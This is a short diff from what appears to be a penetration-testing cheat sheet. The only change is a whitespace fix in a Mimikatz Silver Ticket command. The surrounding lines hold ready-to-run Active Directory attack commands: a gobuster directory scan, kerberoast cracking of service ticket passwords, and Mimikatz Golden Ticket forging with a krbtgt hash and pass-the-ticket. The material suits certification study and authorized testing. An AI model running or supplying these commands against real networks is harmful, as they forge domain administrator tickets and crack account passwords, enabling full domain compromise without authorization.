@@ -309,7 +309,7 @@ gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
             python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-xxxxxx.kirbi
 
         #### 12.2.3 AD - Silver Ticket
-            Invoke-Mimikatz -Command '"kerberos::golden /domain:Get-Domain /sid:Get-DomainSID /target:DOMAIN_CONTROLLER /                    service:CIFS /rc4:serviceAccountPwdHash /user:administrator /ptt"'
+            Invoke-Mimikatz -Command '"kerberos::golden /domain:Get-Domain /sid:Get-DomainSID /target:DOMAIN_CONTROLLER /service:CIFS /rc4:serviceAccountPwdHash /user:administrator /ptt"'
             
         #### 12.2.4 AD - Golden Ticket
         Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:Get-Domain /sid:Get-DomainSID /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
